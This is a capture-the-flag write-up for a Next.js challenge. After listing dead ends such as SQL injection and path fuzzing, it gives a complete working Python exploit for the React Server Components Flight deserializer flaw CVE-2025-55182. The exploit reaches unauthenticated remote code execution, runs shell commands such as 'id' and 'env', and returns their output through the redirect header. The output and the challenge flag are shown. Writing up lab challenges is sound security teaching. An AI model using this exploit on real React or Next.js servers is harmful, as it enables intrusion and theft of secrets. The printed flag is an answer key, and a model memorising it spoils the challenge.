# SALVOR Chapter 1 — Act-er


## Challenge description

**Points:** 3

```
Hi Senior Researcher,

SALVOR is a security-oriented learning environment designed for curious minds and aspiring security professionals. It provides a hands-on space to explore cybersecurity concepts, investigate realistic scenarios, and sharpen practical skills through interactive challenges.

Your task is to gain experience.

Stay curious!

The starting point for your SALVOR journey is http://intro.salvor.nren.tcc
```


## Summary

"DSRepos" is a Next.js App Router app exposing a single Server Action
(`searchAction`, a parameterized SQLite dataset search — a dead end, see
below). The real bug is the app itself: it runs a version of React Server
Components vulnerable to **CVE-2025-55182 ("React2Shell")**, a CVSS 10.0
pre-auth RCE in the Flight protocol's deserializer. A crafted multipart
"Flight chunk" pollutes the parser's internal `_response` object to resolve
`Function`'s constructor, yielding arbitrary server-side JS execution. The
flag sits in the process environment (`FLAG=...`).

## Dead ends (worth knowing before you burn time on them)

- **SQL injection.** The one visible feature is a dataset name search. Its
  wildcard behavior (`%`, `_`) and a null-byte truncation quirk
  (`"a\x00"` → names ending in "a", confirming `LIKE '%'||query||'%'`
  semantics with C-string truncation on the backend) made it *look*
  promising. But quotes, `UNION`, comments — all inert, no error, no
  behavior change. It's a properly parameterized `name LIKE ?`. Dumping
  every one of the 130 rows via `%` confirmed the data itself holds no
  flag. **Don't chase this further — it's clean.**
- **Path/content fuzzing.** dirb's `common.txt` (4.6k words × extensions)
  instantly hit the ingress's `X-RateLimit-Policy: 60r/m;burst=20` and
  produced a wall of false-positive 429s. A slow (~1 req/s), curated,
  Next.js-shaped wordlist (`/api/*`, `/admin`, `/_debug`, `.env`, …) ran
  clean and found **zero** extra routes. This app genuinely has only `/`
  and one server action.
- **SSRF / OOB callback.** A sibling challenge in this CTF (CRMS) turned out
  to reverse-connect to the client. Worth a quick test here too: fed the
  search query our own listener's `ip:port` / URL. No callback ever
  arrived — this app doesn't make outbound requests from user input.
- **Ingress Host-header confusion.** The backend is `ingress-dsrepos.*`
  (Kubernetes-flavored naming), so tried hitting its IP directly with
  spoofed `Host:` headers hoping to reach an internal-only vhost. Every
  Host value returned the identical public app — no vhost smuggling here.

## Solution

### Step 1: Recognize the stack

The page loads `createServerReference(<hash>, callServer, ..., "searchAction")`
and responses to `Next-Action` requests come back as Flight-encoded
`text/x-component`. That's React Server Components + Next.js Server
Actions — which, as of Dec 2025, has a known unauthenticated RCE:
**CVE-2025-55182**. (Verify any such claim before trusting it — the first
reference I had for this was an incomplete placeholder; a web search
against the Datadog Security Labs writeup confirmed it's real and pulled
the actual payload shape.)

### Step 2: Exploit the Flight deserializer for RCE, exfiltrate via NEXT_REDIRECT

The vulnerable code resolves `$`-prefixed path strings against whatever
object it's handed, without checking they're own properties — so a crafted
chunk walks `__proto__` to get `then()` called on it as a fake promise
during deserialization, and a second `$`-path resolves `constructor:constructor`
to the `Function` constructor. From there, `_response._prefix` is attacker
JS. No listener needed for exfil: throwing Next.js's internal `NEXT_REDIRECT`
"error" returns our data straight back in the `x-action-redirect` response
header.

```python
import json, uuid, urllib.request, urllib.error
from urllib.parse import urlsplit, parse_qs

TARGET = "http://dsrepos.salvor.nren.tcc/"
# Any server action hash from the app works — grab one from a client JS
# chunk's createServerReference(...) call.
ACTION = "408546c41408a4d838d2327e502902d9c84e9e3457"

def run(shell_cmd: str) -> str:
    js = (
        "var o=process.mainModule.require('child_process')"
        f".execSync('{shell_cmd}').toString();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});"
    )
    # The fake Flight chunk: "then" walks __proto__ so React treats this
    # object as a thenable during deserialization; _formData.get resolves
    # via constructor:constructor to Function, which then executes _prefix.
    chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\": \"$B0\"}",
        "_response": {
            "_prefix": js,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    boundary = "----x" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
        f"{json.dumps(chunk)}\r\n"
        # "$@0" is mandatory — it's the Flight back-reference syntax that
        # tells the parser field "1" (the action's arg array) points at
        # chunk 0. A bare "@0" (no leading $) is NOT recognized as a Flight
        # reference and the whole request silently falls through to a
        # normal page render instead of invoking the action.
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n"
        f'"$@0"\r\n'
        f"--{boundary}--\r\n"
    ).encode()

    req = urllib.request.Request(TARGET, data=body, method="POST", headers={
        "Next-Action": ACTION,
        "Accept": "text/x-component",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    try:
        resp = urllib.request.urlopen(req, timeout=20)
        headers = resp.headers
    except urllib.error.HTTPError as e:
        headers = e.headers  # Next.js responds 303 via the error path
    redirect = headers.get("x-action-redirect", "")
    qs = parse_qs(urlsplit(redirect.split(";")[0]).query)
    return qs.get("a", [""])[0]

print(run("id"))      # confirm RCE: uid=998(dsrepos) gid=998(dsrepos) ...
print(run("env"))      # -> FLAG=FLAG{2cgd-Jb3C-0Tib-Iol9} among the output
```

Output of the `env` call includes:

```
...
FLAG=FLAG{2cgd-Jb3C-0Tib-Iol9}
NODE_ENV=production
...
```

## Flag

```
FLAG{2cgd-Jb3C-0Tib-Iol9}
```
